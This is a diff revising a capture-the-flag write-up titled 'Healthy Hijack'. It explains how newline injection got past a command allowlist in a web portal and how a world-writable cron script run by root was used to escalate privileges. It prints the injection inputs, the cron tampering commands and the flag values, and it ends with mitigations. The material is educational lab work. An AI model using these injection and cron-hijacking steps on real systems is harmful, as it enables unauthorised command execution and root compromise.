@@ -13,36 +13,27 @@ tags:
   - Cron Abuse
 ---
 
-# KPMG CTF 2026 — Healthy Hijack
+# KPMG CTF 2026 - Healthy Hijack
 
 ---
 
 ## Challenge Description
 
-> A "Safe Command Runner" web portal allows only network debugging commands such as `ping`, `traceroute`, and `nslookup`. Obtain both the user flag and the root flag from the container.
-
-**Flags:** Two — user-level (`appuser`) and root-level.
+> A "Safe Command Runner" web portal that claims to only allow network debugging commands like `ping`, `traceroute`, and `nslookup`. Get both the user flag and the root flag from the container.
 
 ---
 
-## Step 1 — Reconnaissance
+## Step 1 - Recon
 
-The application exposed a single `/run` endpoint that accepted a `cmd` form field. Submitting `ping 1.1.1.1` reached the binary but failed immediately:
-
-```text
-ping: socket: Operation not permitted
-ping: ⇒ missing cap_net_raw+p capability or setuid?
-```
-
-Submitting `id` directly was rejected with an "invalid command" error, confirming the app validated the command name before execution. Common shell separators were blocked too — sending `ping -c 1 127.0.0.1; id` produced only the ping error with no `id` output.
+The app had a `/run` endpoint that took a `cmd` field. Trying `ping 1.1.1.1` hit the binary but failed with a permissions error. Trying `id` directly got rejected outright, so we knew the app was checking the command name. Semicolons were also blocked - `ping -c 1 127.0.0.1; id` just returned the ping error, no `id` output.
 
 ![Command bypass using # trick](/img/posts/kpmg-ctf-2026-01_command_bypass.webp)
 
 ---
 
-## Step 2 — Source Code Analysis
+## Step 2 - Reading the Source
 
-Reading `/app/app.py` via the injection revealed the filter implementation:
+We read `/app/app.py` through the injection to understand the filter:
 
 ```python
 ALLOWED_COMMANDS = ["ping", "traceroute", "nslookup"]
@@ -57,46 +48,32 @@ def sanitize(user_input):
     return user_input
 ```
 
-The application then ran the sanitized input directly in a shell:
+And the execution:
 
 ```python
 subprocess.run(cmd, shell=True, ...)
 ```
 
-**Key Findings:**
-- `is_allowed` only checks that the input **starts with** an allowed command — it does not validate the rest.
-- The blacklist removes common shell operators but **does not remove newline characters (`\n`)**.
-- `shell=True` passes the full multi-line string to `/bin/sh`, which treats newlines as command separators.
+The allowlist only checked that the input **started with** a valid command. The blacklist stripped common shell operators but completely missed newline characters. Since `shell=True` passes the whole string to `/bin/sh`, a newline separates it into two commands.
 
 ---
 
-## Step 3 — Newline Injection (Part 1: User Flag)
+## Step 3 - Newline Injection to Get the User Flag
 
-The textarea in the browser submits `\r\n` line endings. A bare newline left a stray `\r` attached to the next command name, causing it to fail. Appending `#` to each line comments out the carriage return:
-
-```text
-ping -V #
-id #
-```
-
-This produced:
-
-```text
-uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
-```
-
-Reading `/entrypoint.sh` showed the user flag was written to `/home/appuser/user.txt` with mode `644` at container startup.
-
-![Flag location from entrypoint](/img/posts/kpmg-ctf-2026-02_flag_location_entrypoint.webp)
+The textarea sends `\r\n` line endings. The stray `\r` would get attached to the next command name and break it, so we added `#` at the end of each line to comment it out:
 
 ```text
 ping -V #
 cat /home/appuser/user.txt #
 ```
 
-### Flag 1 (User)
+We knew where the flag was because `/entrypoint.sh` showed it gets written to `/home/appuser/user.txt` with mode `644` on startup.
 
-```text
+![Flag location from entrypoint](/img/posts/kpmg-ctf-2026-02_flag_location_entrypoint.webp)
+
+### Flag 1
+
+```plain
 KPMG_CTF{5NGFEr8rYdC-SkS6lM0vQnwHTHq0mKr72f8_WeMZcMIN}
 ```
 
@@ -104,27 +81,26 @@ KPMG_CTF{5NGFEr8rYdC-SkS6lM0vQnwHTHq0mKr72f8_WeMZcMIN}
 
 ---
 
-## Step 4 — Privilege Escalation (Part 2: Root Flag)
+## Step 4 - Privilege Escalation to Root
 
-With arbitrary command execution as `appuser`, we enumerated the system for privilege-escalation paths.
+With command injection as `appuser`, we started looking for privesc paths.
 
-### Reconnaissance
+### Finding SUID Binaries and Writable Files
 
 ```text
 ping -V #
-id #
 find / -perm -4000 -type f 2>/dev/null #
 ```
 
 ![Recon as appuser](/img/posts/kpmg-ctf-2026-03_p2_recon.webp)
 
-The SUID search found `/usr/sbin/exim4`. Its command-line options required administrative privileges, so it was a dead end for this instance.
+`/usr/sbin/exim4` showed up as SUID but its options needed admin privileges, so it was a dead end.
 
 ![Finding writable locations](/img/posts/kpmg-ctf-2026-04_p2_find_writable.webp)
 
-### Cron Analysis
+### The Cron Config
 
-Checking `/etc/crontab` revealed the real attack surface:
+Checking `/etc/crontab` is where things got interesting:
 
 ```cron
 * * * * * root /opt/healthcheck.sh
@@ -136,28 +112,19 @@ Checking `/etc/crontab` revealed the real attack surface:
 * * * * * root find /tmp -perm /4000 -delete
 ```
 
-The health check script ran as **root every ~10 seconds**. Checking its permissions:
-
-![Crontab contents](/img/posts/kpmg-ctf-2026-05_p2_crontab.webp)
+Root runs the health check script every 10 seconds. We checked the file permissions:
 
 ```text
 -rwxrwxrwx 1 root root ... /opt/healthcheck.sh
 ```
 
-The file was owned by root but **world-writable (`0777`)**. Its original content was benign:
+World-writable. The `find /tmp -perm /4000 -delete` job was a red herring to distract from SUID abuse - the real path was this script.
 
-```sh
-#!/bin/sh
-# System healthcheck
-echo "OK" > /tmp/health.log
-```
+![Crontab contents](/img/posts/kpmg-ctf-2026-05_p2_crontab.webp)
 
-> [!NOTE]
-> The `find /tmp -perm /4000 -delete` cleanup job was a red herring — it cleared any SUID binaries from `/tmp`, so the real path was the writable script.
+### Exploiting It
 
-### Exploiting the Cron Script
-
-We appended flag-copy commands to the script:
+We appended a flag-copy command to the script:
 
 ```text
 ping -V #
@@ -166,7 +133,7 @@ printf '\n/bin/cp /root/root.txt /tmp/rootflag\n/bin/chmod 644 /tmp/rootflag\n' 
 
 ![Exploiting the cron job](/img/posts/kpmg-ctf-2026-06_p2_exploit_cron.webp)
 
-After waiting for the next cron execution (~10 seconds), we read the copy:
+Waited about 10 seconds for cron to fire, then read it:
 
 ```text
 ping -V #
@@ -177,17 +144,15 @@ cat /tmp/rootflag #
 
 ### Cleanup
 
-We restored the original script content and removed the temporary file:
-
 ```text
 ping -V #
 printf '#!/bin/sh\n# System healthcheck\necho "OK" > /tmp/health.log\n' > /opt/healthcheck.sh #
 rm -f /tmp/rootflag #
 ```
 
-### Flag 2 (Root)
+### Flag 2
 
-```text
+```plain
 KPMG_CTF{Ymllhoq12FPE13ifQowH_8hOefYuEQMea7bGiq1LOuZE}
 ```
 
@@ -197,15 +162,15 @@ KPMG_CTF{Ymllhoq12FPE13ifQowH_8hOefYuEQMea7bGiq1LOuZE}
 
 ## Mitigations
 
-| Vulnerability | Recommended Fix |
+| Vulnerability | Fix |
 |---|---|
-| Allowlist bypass via newline injection | Strip `\n` and `\r` in `sanitize()` alongside other shell metacharacters |
-| `startswith` logic for command validation | Validate only the first whitespace-delimited token, not the whole string |
-| `shell=True` with user input | Use `subprocess.run([cmd, *args], shell=False)` with an explicit argument list |
-| World-writable root-owned cron script | Set `/opt/healthcheck.sh` permissions to `0755` or `0700` |
+| Newline injection bypass | Strip `\n` and `\r` in `sanitize()` |
+| `startswith` allowlist check | Validate only the first whitespace-delimited token |
+| `shell=True` with user input | Use `subprocess.run([cmd, *args], shell=False)` |
+| World-writable root cron script | Set `/opt/healthcheck.sh` to `0755` or `0700` |
 
 ---
 
 ## Summary
 
-The challenge combined two weaknesses. First, a command allowlist that used `startswith` without filtering newlines allowed arbitrary shell command injection via a multi-line textarea input. Second, a cron script executed by root every ten seconds had world-writable permissions, letting the low-privilege `appuser` backdoor it to copy the root flag to a readable location. Together they formed a clean two-stage exploit chain from zero-auth RCE to root.
+Two bugs chained together. The command filter only checked the start of the input and forgot about newlines, which the shell happily treated as command separators. Once we had code execution as `appuser`, we found a root-owned cron script that was world-writable - we just appended our own command to it and waited for root to run it.
